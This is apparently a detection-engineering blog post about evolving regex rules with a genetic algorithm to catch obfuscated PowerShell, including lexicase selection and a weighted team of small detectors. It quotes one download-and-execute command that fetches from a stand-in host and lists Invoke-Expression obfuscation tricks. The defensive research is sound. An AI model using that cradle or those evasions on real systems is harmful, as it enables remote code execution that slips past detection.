Why Mario inspired me to poke around genetic regex evolution

October 21, 2026 • 5654 words • 27 min

Can a Computer Evolve Its Own Detection Rules?

Teaching a machine to evolve it’s own regex patterns that catch obfuscated PowerShell

Prologue: a video, eleven years ago

The inspiration for this project was drawn many moons ago from a YouTube video: MarI/O (SethBling, 2015 - youtube.com/watch?v=qv6UVOQ0F44). In it, a computer is handed the controls to Super Mario World and told that getting further to the right is good, but nothing about enemies, jumping, or how the game works. Initially it simply twitches, confused and lost and subsequently dies on the first Goomba. After thousands of attempts across many generations, keeping and combining whatever iterations managed to make it little further. Eventually with enough generations, it plays the level. Nobody programmed it to do this. It evolved the skill.

That was my first introduction to genetic algorithms, and the idea got lodged in my head like the Belgian hit techno single; Pump up the Jam. A computer finding a solution by trial and a lot of error, selection and breeding. For a long while now i’ve wanted to direct that same idea at my own field - detection engineering. Not necessarily for any other reason but curiosity, which lets face it is often the best reason lest you be of feline persuasion.

Two things make attempting that far easier in 2026 than in 2015. Firstly, for good or bad the bar for creating such project has fallen to the floor, a capable LLM lowers the barrier to entry enormously. Slop or not the ability to accelerate projects to the point of getting answers and reasoning through the findings, problems and challenges is nothing short of revolutionary. With the normal caveats that having reasonable domain knowledge and checking the LLM’s output is rather important. That being said the new frontier models as of Autumn 2026 are getting frighteningly good at producing code.

0. The whole story in a few sentences.. paragraphs

To frame this entire premise.

Attackers obfuscate PowerShell so the simple “| where process_name contains “Invoke-Expression” detections miss it.

The question this blog is attempting to answer is if we throw this obfuscation problem into a class of Machine Learning that uses Genetic Algorithms can it find a solution to detect against adversarial obfuscation patterns?

In short we managed it with some obsticals along the way. The impatient reader can close this now, curiosity satiated. Our system breeds a rule that beats the dumb baseline, but it hits two separate walls along the way.

Wall 1 is getting stuck on a “good enough” rule: we got past it with simply waitinf for more iterarions. Then after doing what a far more sensible person would have started with.. perform a literature review We found a far more reliably and ~4x faster by borrowing a selection trick from the research literature (lexicase selection).

Wall 2 Was a bit more cumbersome to clamber over: the computer cannot assemble the structure needed to see through the obfuscation, even when we hand it the exact missing piece. We pinned that down by ruling out every other explanation, one experiment at a time. Until I thought rather than let the poor thing suffer by itself I myself could lend an “expert” hand. Without going into the weeds I’ve written a rather effective detection that identifies Obfuscation in the past and a key component was rather than attempting to boil the ocean with one regex attempting to do everything, instead splitting the work up over twelve small detectors with a weighted score.

Which raised the unsuprising finding that it works when you engage your brain and work out ways to decompose the problem and fails when you hand it the whole thing with little to no direction to the AI. Which most of us paying attention already knew and it’s lovely to know my human brain still has value.

1. A familiar problem

A malicious PowerShell download-and-run command might look like this:

powershell -nop -w hidden -Command "Invoke-Expression ((New-Object Net.WebClient).DownloadString('http://evil.example/p'))"

The tell-tale pieces:

  • Invoke-Expression (run this text as code), DownloadString (pull it off the internet),
  • -EncodedCommand / -w hidden (launcher flags)

These are the things a detection looks for.

Threat Actors know that, so they obfuscate: disguise the command so it still runs as normal but no longer reads like the thing your rule searches for.

A few examples:

Technique Invoke-Expression becomes… Still runs?
Case randomisation InVoKe-ExPreSsIoN Yes
Backtick insertion I`nvoke-Expres`sion Oh yes
String concatenation ('Inv'+'oke-Expr'+'ession') Yes indeed
Alias iex Indeed it do
Format-operator reorder ("{1}{0}"-f'ession','Invoke-Expr') Oh my yes
Base64 -EncodedCommand Also yes

The first four still contain the letters i, e, x in order, just with other characters sprinkled between them. The last two genuinely scramble or hide the letters.

A plain string search (grep "Invoke-Expression") catches none of these except the untouched original. A skilled analyst can write a cleverer search that ignores the junk. But can we get a computer to invent that smarter search on its own?**

In other words, can I automate myself out of a job.

2. The tool we’re evolving: a regex

A regex (regular expression) is a search pattern. Most people in security have written one. And if your anything like me have to google the pattern matching rules each time you do.

The anti-obfuscation technique, written as a regex, is to allow “junk” between each required letter. Where a naive search is just iex, an analyst writes something like:

i[`'"+\s]*e[`'"+\s]*x

Read that as: “an i, then any amount of backtick/quote/plus/space junk, then an e, then more junk, then an x.” That one pattern catches iex, i`ex, ('i'+'ex'), and so on. This can be refered to as noise skipping noise skipping, and the junk characters (backtick, quotes, +, whitespace) we can call the noise.

So the thing we want the computer to produce is a regex pattern. The question is how do we get a computer to invent a good one itself without us telling it the answer?

3. Evolution, applied to search rules

The technique is a genetic algorithm which was the method behind the MarI/O video from the prologue.

To use an analogy; sorry Dawin Tortoise racing is commonly frowned upon so I’ve ran with horse racing.

If you want faster racehorses, you can’t calculate the perfect horse.

  1. Start with a population imagine a field full of random horses.
  2. Race them and keep the fastest (selection).
  3. Breed the winners together, mixing their traits (crossover).
  4. Occasionally a foal is born with a random change (mutation).
  5. Repeat for many generations. The field gets faster over time.

Bear with me here but if we swap “horse” for “regex” and “race time” for “how well it catches the malicious text.” That’s the theory behind Genetic Algorithms:

  • Population: a few hundred randomly-generated regexes.
  • Fitness (the race): a score for how well each regex catches the malicious strings without firing on benign ones. The higher the score, the “fitter” the regex. The scoring recipe is called the fitness function it’s the judge, and everything the algorithm does is in service of scoring higher on it. (Remember this for later)
  • Selection: keep the high-scorers.
  • Crossover: take two good regexes, swap a chunk of one into the other, hope the child is better.
  • Mutation: randomly tweak a regex change a character, add a repeat, etc. (If your interested ask my why this is important)
  • Generations: do this many times and watch the best score climb.

No one tells the computer what a good regex looks like. It only ever gets a score, and it climbs - exactly like MarI/O was only ever told how to jump. When the “creatures” being evolved are themselves little programs (here, regexes), the field calls it genetic programming, but it’s the same breeding loop.

Note:

From what I’ve read MarI/O doesn’t use Reinforcement Learning the fitness score was how far right it moved and how quickly. I’ve seen/read some commentary about the video saying it used the score in Reinforcement Learning.

You can watch ours do it:

This is our own MarI/O-style time-lapse, but the creature is a regex and the “score” is how much malicious text it catches. It flails, plateaus for dozens of generations matching useless fragments, then suddenly breaks through, the same struggle as shown in the Mario run, although arguably less cute.

Why evolution and not “just use AI / an LLM I hear you cry?”

The point was to understand the method by building it, and to satisfy my curiosity of if it works at all. As ever the friends we made was the learning along the way.

4. Testing and Hacking, but not in the way you know it!

4.1 Generating data

We generated the malicious examples from templates, applying the obfuscation techniques above at six escalating levels:

(L0 = untouched, up to L5 = heavily scrambled / base64).

Because we applied the obfuscation, we know exactly where each indicator’s characters ended up. Everything points at example.invalid and carries benign markers; nothing executes. We also generate a benign corpus of normal admin commands, including deliberately tricky “hard negatives” (e.g. a legitimate iex, or a real -EncodedCommand that sysadmins genuinely use) so the detector has to actually be discriminating, not just trigger-happy and leave a hypothetical SOC drowning in Benign Positives.

This corpus turned out to be it’s own wall, we needed many more examples so later in section 8 a larger corpus was created.

4.2 Two measures: the floor and the ceiling

As with many things in life you can’t tell if a score is good without having something to compare it against. We use two baselines these are rules we did not evolve:

  • keyword - the simpliest possible rule: the literal indicator as a plain string (iex, invoke-expression). Catches the un-obfuscated spelling and nothing else. This is the floor: if evolution can’t beat this, it has learned nothing.

  • expert - the noise-skipping pattern from Section 2, the best a skilled analyst who understands the obfuscation would hand-write. This is the ceiling: it catches everything that is still visible in the text, so no raw-text regex can beat it.

Every evolved regex is judged against both measures, on the same data. “It worked” has to mean “it beat the floor and approached the ceiling,” not “it got a high-looking number.”

4.3 Stopping Reward Hacking - Score the characters and not just a yes/no

Our first attempt scored each regex on a simple yes/no: did it fire on a malicious command or not?

It scored ~0.98 wow perfect lets write up and go to bed. Although much to my dismay on inspection, it was cheating: because our malicious commands all happened to contain launcher flags like -ExecutionPolicy, the regex learned to fire on the substring -e and ignore the actual indicator entirely!

It wasn’t detecting Invoke-Expression; it was detecting “this command has a flag,” which every command in the set had.

This is reward hacking

The fix was to change what we measure. Instead of yes/no, the regex must highlight the exact characters of the indicator. Much like a SOC analyst highlighting with snipping tool the suspicious log.

Now we have:

  • Matching the real indicator’s characters = Positive score points
  • matching the wrong characters (a flag, filler) = Negative score points

Suddenly the -e cheat is worthless: those are the wrong characters. This is called span extraction, and it dissolved the cheating by construction rather than by us endlessly patching the data. We score it with three standard Machine Learning metrics:

  • Precision: From the characters the regex highlighted, what fraction were actually indicator characters? (Low precision = noisy, lots of false highlights = alert fatigue.)
  • Recall: From the indicator characters that were there to catch, what fraction did it highlight? (Low recall = misses = blind spots.)
  • F1: A single balanced blend of the two (1.0 = perfect, 0 = useless). We quote F1 as the headline and precision/recall when the story is in the trade-off.

Note:

We deliberately avoided plain “accuracy.” On this kind of data most text is not an indicator. A rule that flags nothing scores 95%+ accuracy while catching nothing.

5. What happened: The story in seven(ish) experiments

Evolution gets partway, then stalls at a hard ceiling of about 0.70 F1 above the floor (0.61) but nowhere near the expert ceiling (1.0).

The rest of these experiments were detective work: why does it stall? We changed one thing at a time an ablation this is the discipline of troubleshooting by toggling a single variable until the cause was identified. I’ve only included the more interesting experiments for brevity.

Exp 1 The first run: it stalls below the baseline

When evolving a rule for the Invoke-Expression indicator, the best evolved regex scored 0.49 this is worse than the keyword floor (0.61), and far from expert (1.0). Taking a look at the regex explained that it had latched onto common fragments like exp (from “expression”) and sio (from “expression”). It never once highlighted a complete indicator.

Exp 4 Does it just need more time?

We provided it 4x more generations. One run in three broke through: it beat the keyword floor (0.68 > 0.61) and, for the first time, highlighted 27 complete indicators. Watching its score over time told the story. it sat flat at ~0.50 for seventy generations, then a lucky breeding event (Life finds a way) in the final ten generations jumped it to 0.64. So the first wall isn’t infinitely high; it’s a valley the algorithm can occasionally tunnel through, given enough attempts. The breakthrough rule used \w+ (regex for “a run of letters/digits”) to span across letters.

Exp 5 - Can we make the breakthrough reliable? (Yes - with restarts.)

A breakthrough that happens “sometimes” isn’t a strategy for robust detections. But sometimes is measurable. We ran many independent attempts and measured the escape rate as ~36% per run at the longer budget, rising to ~56% with more time. That means we can turn luck into engineering. If each run succeeds 36% of the time, running 7 in parallel gives you >95% odds that at least one breaks through. So reliable escape is just “best of N attempts.”

However every single successful run topped out at the same ~0.70 all of them using that \w+ trick. And \w matches letters and digits, not the backtick/quote/+ noise. So while it sails through case changes it’s very much completely blind to i`ex and ('i'+'ex'). That’s the second wall, and nothing had touched it.

Interlude - “stuck on a good-enough answer”

At this point I’d like to point out if this was a proper research paper or anything more than a series of curious experiments a proper literature review would have been the starting point. The unsatisfactory progress I was having with these experiments can be attributed to some the oldest problems in evolutionary computing, and the MarI/O video from the prologue is built on one of the classic answers. MarI/O used an algorithm called NEAT (2002).

A new, half finished idea almost always performs worse than the mature incumbent, so a naive “keep the best scorer” rule kills it before it ever had the time to improve.

NEAT’s fix is speciation by sort the population into “families” of similar individuals and make them compete mainly within their family, so a new design is only judged against its own kind while it matures. Think of it as running a pilot program instead of benchmarking a new detection against a tuned production rule on day one.

Whilst this sounds promising NEAT is 24 years old, though, so rather than reach for it by reflex we carried out a short literature review of what the field has developed since. Four ideas stood out, each answering “how do you keep promising but currently-weak candidates alive?”

Concept Official name Relevance to us
Judge candidates on individual test cases, not their average, so specialists survive Lexicase selection (2014+) Highest: cheap to add, built for exactly our many test cases setup
Reward being behaviourally different, not just higher-scoring, so the search can’t settle on a deceptive peak Novelty search / MAP-Elites (“quality-diversity”, 2011+) Medium: we already compute a behaviour fingerprint per rule

I decided to focus on improvements from lexicase selection it was the quick to build into our project, and it targets the wall we had already seen cross (wall 1) rather than the one we hadn’t.

Exp 7 Protecting the specialists: lexicase selection

Here is the problem lexicase solves, in a security analogy. Imagine ranking your analysts by their average score across every alert type. The one analyst who is the only person who reliably catches a rare evasion technique but is mediocre on routine alerts gets an unremarkable average and is let go. The team loses the one skill it was missing. That is exactly what our selection step was doing. By scoring each regex by its average over all commands, so a rule that nailed the hard obfuscated cases but was mediocre on easy ones got averaged out of existence.

Lexicase selection picks parents differently. It shuffles the individual test commands and walks through them one at a time, each time keeping only the candidates that did best on that specific command, until one is left. A rule that is the sole best on even one hard case can win and breed. We changed only the selection step and nothing else, ran six attempts each way, and compared:

Selection method Attempts that beat the keyword floor Typical (median) F1 Typical generation of breakthrough
Original (“keep the best average”) 3 of 6 0.57 (below the floor) ~generation 107 (and only 3 of 6 ever got there)
Lexicase 6 of 6 0.69 (above the floor) ~generation 27 (all 6 got there)

Two things to take from that table:

  • It broke wall 1 early and reliably. Every lexicase attempt climbed off the fragment plateau, at a typical generation of 27 versus 107. Roughly four times sooner. The typical lexicase run is now a usable detector; the typical run under the old method was not. Before, we needed to run about seven attempts in parallel and hope one escaped; now almost any single attempt works!
  • It did not touch wall 2. The best lexicase result was 0.72 (the original method’s best was 0.68). This is still far from the expert’s 1.0. That is exactly what the mechanism predicts: lexicase changes who gets to breed, not what the breeding moves are able to build. The rules it found still use the \w+ shortcut and still cannot assemble the noise-skipping structure.

That makes the two walls cleanly separable, which is itself a useful to reflect upon: wall 1 is a selection problem and lexicase fixes it; wall 2 is an operator problem and needs a different tool.

6. The bottom line

Stacking the experiments up, the ~0.70 ceiling has a clean explanation, with every alternative ruled out:

We suspected… Experiment Verdict
It learned nothing 1 Stalls on fragments, below the floor
Bad building blocks 2 No, random blocks are worse
The length penalty 3 No, no effect or bloat
Not enough search time 4 Partly,more time -> occasional breakthrough
Breakthrough is unreliable 5 Solvable, ~36-56% per run, so run several
Missing materials / too-tight limits 6 No, given the part and the room, still stuck
Averaging scores kills the specialists 7 Yes, for wall 1 lexicase: 6/6 attempts beat the floor, ~4x sooner
Left standing: the breeding operators can’t assemble the structure - This is wall 2

A genetic algorithm can evolve a plain, portable, human readable regex that beats a naive keyword detector for obfuscated PowerShell. With a selection method that protects specialists (lexicase), it does so on almost every attempt rather than one in three. But it still cannot, with these breeding operations, reach the quality of a hand written detection, because it cannot assemble the repeating noise-skipping structure.

7.1 Where Experiments 1-7 left us

I left this set of seven experiments for a week or so with an unsatisfied feeling, we were left with one rather stubborn problem. A single evolved regex climbs off the floor, but it stops at about 0.70, far short of the hand-written expert’s 1.00. Running the evolutions for more generations, restarts, better building blocks, a different length penalty and a smarter selection rule. Each fix moved the number a little, and none of them moved the ceiling.

The cause is the second wall. To see through obfuscation a regex has to assemble a repeating pattern, letter, noise, letter, noise, and the breeding moves of a genetic algorithm (swap a branch, tweak a character) almost never build that. Every experiment so far tried to make one regex cleverer. None asked whether it should be one regex at all.

7.2 The potential solution: stop asking one regex to do everything

This is where expedience pays dividends. In production detection I have had far more success chopping a hard rule into many small parts than brute-forcing one clever pattern. The rule I write does not look for “an obfuscated Invoke-Expression”. It runs a dozen tiny regexes, each hunting for exactly one trick: a backtick, a + joining string pieces, a base64 blob, a caret, a non-ASCII look-alike. Each one reports how many times it fired. A weighted sum turns those counts into one score, and a cutoff decides whether to alert.

The prediction was simple. Nobody has to assemble anything inside a regex any more. The backtick detector is one character, and the combining is arithmetic. If evolution can build twelve tiny specialists, a standard maths step (logistic regression, a textbook method for learning how much to trust each signal) can do the rest. Evolution no longer has to climb wall 2, because the wall is no longer on the path.

The animation below scores one malicious and one benign command, one detector at a time. Notice that no single detector decides anything. The evidence stacks up.

The twelve detectors are the four “what is it doing” slots from earlier chapters (run code, decode base64, download, launcher flags) plus eight “how is it hiding” detectors. All twelve were evolved, using the lexicase selection from Section 5. The weights and the cutoff are learned on one slice of the data, and every number below comes from a third slice that nobody tuned on.

Watching all twelve evolve at once shows why this works. The tiny detectors snap to a perfect score within a few generations, while the payload detectors creep upwards. That lopsidedness is wall 2, now seen from the outside.

7.3 The challenges

The result above was not the first one I got. Each time the scoreboard looked good, something turned out to be flattering us. Five problems ended up shaping the final design.

  1. A test bench that was too easy. The first benign set was about 30 commands, and the held-back slice had 8 of them, none obfuscated. A detector could not learn what harmless-but-disguised looks like, so I rebuilt the benign side into several hundred commands. I also built two worlds. In the hard world 76% of benign commands carry some disguise (think admin scripts and installers). In the realistic world only 12% do. The learned weights change between the two, which is the base-rate lesson every detection engineer knows: a signal that is common in benign traffic deserves little weight.
  2. Shortcuts and silent bugs. A rule that only looked for -NoProfile-style flags beat a perfect code-execution regex, because 72% of malicious commands carried flags and only 4% of benign ones did. I added legitimate launcher commands and ran a drop-one test, which showed the finished detector never relied on them. Separately, the “legitimate non-ASCII” test commands were silently plain ASCII because of a typing slip. Tests now guard that.
  3. The stragglers were a ReDoS bug. Three runs took about 15 hours. Timing the finished patterns showed why: a few evolved regexes backtrack catastrophically (the same class of problem as ReDoS, regular-expression denial of service). A stricter safety rule plus a 10 millisecond limit per search made the same runs finish in 3 to 18 minutes. If you deploy a machine-written regex, time it against hostile input first.
  4. The base64 detector learned the generator, not base64. I added 81 legitimate commands containing things that look like base64 (hashes, tokens, thumbprints) and re-evolved. The false alarms vanished, but not because the detector got smarter. It memorised that every malicious blob our generator makes contains the letters q and k. On fresh base64 it matched about 1 in 10. The algorithm did what I asked (stop alerting on these) and found the cheapest way to do it.
  5. The fix came from production: decode it. Do not ask whether a string looks like base64. Decode it, and see whether the result is text. A hash decodes to noise and is discarded. An encoded command decodes to the script it was hiding, and the payload detectors can now read it. This hand-written layer (about a dozen lines, no evolution) is also what clears the legitimate -EncodedCommand false alarms that no text-only regex could remove. I then extended it to deflate, gzip and XOR with a visible key.

Then I tested whether the new attacks would break anything. They did not, which was a result in itself. Deflated, gzipped and XORed commands were already caught perfectly (AUC 1.000), because the code that unpacks a script has to run it, so it contains IEX and FromBase64String, the very signals the old detectors hunt. Hiding the payload is not the same as hiding the decoder, and a new test that the old system already passes tells you nothing about the new defence.

7.4 Final results

AUC is the chance that a randomly chosen malicious command scores higher than a randomly chosen benign one: 0.5 is a coin flip, 1.0 is perfect. Everything below is AUC on held-back test commands (hard / realistic world), with the evolved detectors from the final re-evolution unless stated.

What was scored Hard Realistic
One regex: the code-execution slot alone (the Section 5 setup) 0.739 0.764
Four payload regexes, one per slot (the fair “single regex” baseline) 0.944 0.916
Eight disguise detectors alone 0.913 0.978
All twelve together (the team) 0.977 0.976
The same twelve, written by hand (no evolution) 0.987 0.970

Three things stand out.

  • The team beats the single regex. One regex scores 0.74 and the team scores 0.98, a gain of +0.24. The fairer comparison is against four single regexes (one per payload slot), because that is the same four signals without the disguise detectors or the weighted sum. The gain there is smaller but real: +0.033 (hard) and +0.060 (realistic), and both intervals clear zero. Quoting +0.24 on its own would flatter me.
  • Evolved ties hand-written. The differences (-0.010 and +0.006) are inside the noise. A hand-written set of the same twelve small regexes does as well as the evolved one. So the lesson of this project is decompose, not evolve. Evolution found the pieces, but a person could have written them.
  • The single-regex slots only look competitive. At each system’s own cutoff, the four payload regexes catch as many heavily obfuscated commands as the team. They get there by alerting on 8% (hard) and 31% (realistic) of benign commands, against 2% and 5% for the team. A detector that alerts on 30% of benign traffic will find anything.

I also reran the same comparison on four different test benches as the corpus grew harder and the generator grew richer. The evolved set stayed within about 0.02 of the hand-written one every time (0.974 to 0.988 against 0.964 to 0.990). The number barely moves between benches. What moves a lot is the false-alarm picture, which is a fair summary of how this project went.

With the decode layer added, the final system reaches 0.989 (hard) and 0.984 (realistic), and the decode count (how many blobs decode to text) becomes the single biggest contributor. That is partly a statement about my generator, in which every malicious blob decodes to text by construction.

Why many small regexes beat one big one

  1. Small detectors are easy to evolve. A backtick detector is one character, and evolution finds it in a handful of generations (watch the race animation above). The assembly step that blocked the single regex is never asked of any individual detector. The wall was bypassed, not broken: the EXEC regex still stalls at about 0.70 inside the team.
  2. Arithmetic does the combining. A regex can only say “matched” or “did not”. A weighted sum can say “three weak signals and one strong one”, and each weight reads as a sentence about how much you trust that signal.
  3. The parts cover each other’s blind spots. In the hard world payload detectors alone scored 0.944 and disguise detectors alone 0.913, together 0.977. A command that hides its payload is caught by the disguise, and a command that hides nothing is caught by the payload.
  4. The scorer can be retuned without re-evolving anything. Move to a network with different benign habits and you re-fit twelve weights. A single regex has to be rebuilt.

7.5 What to take away if you never plan touch a genetic algorithm

  • Decompose before you optimise. If a detection is hard to write as one pattern, ask whether it is really several easy patterns and a weighting.
  • Make weights readable, and let them follow the base rate. A signal that is common in your benign traffic should earn a small weight, and the weight should be flexible enough to be reviewed when the environment changes.
  • Test against suspicious looking legitimate examples, not only malicious samples. Hashes against a base64 detector, admin scripts with a real -EncodedCommand.
  • Probe a learned detector with inputs it has never seen. Mine looked excellent until I tried fresh base64.
  • Delete your best feature and see what is left. Mine was base64, and launcher flags until I checked.
  • Decode, then judge the content. Asking whether a string is shaped like a payload is fragile. Asking what the string actually says is not.
  • Time-limit anything generated. Whether the regex came from a genetic algorithm, an LLM or a colleague, run it against hostile input with a timer before it goes near production.
  • Treat the benign corpus as the product. Most of my improvements came from fixing the benign data, not the algorithm.

7.6 Conclusion

When setting out I had two primary goals in mind, to see whether a genetic algorithm could evolve a regex for obfuscated PowerShell and to learn more about Genetic Algorithms and how they work. On the first point it can, up to a point. A single evolved regex beats a naive keyword rule, and with a selection method that protects specialists it does so almost every time. Even then it still hits a ceiling around 0.70 that no amount of time, tuning or luck lifted, because the breeding moves cannot assemble the structure that sees through obfuscation.

The way past was not a better algorithm, more generators or clever hyper-parameter tweaks. It was a taking a different approach to the problem, learned through past experiences. A team of tiny detectors, a weighted sum, and a decode step borrowed from production. Evolution built the pieces and tied a hand written example, so the most portable lesson from this approach is the decomposition, not necessarily the evolving. This is a topic i’d love to explore in it’s own post I have some rather pretentious views of how to write detections.

The deeper lesson is about trust in your own numbers. Almost every improvement in this project came from discovering that the scoreboard was not quite telling the whole story to me (a too-easy benign set, a shortcut flag, a memorised generator signature, attacks that were already caught).

Open questions I did not get to: wrappers that also hide IEX and FromBase64String, a second independent generator, and real telemetry.
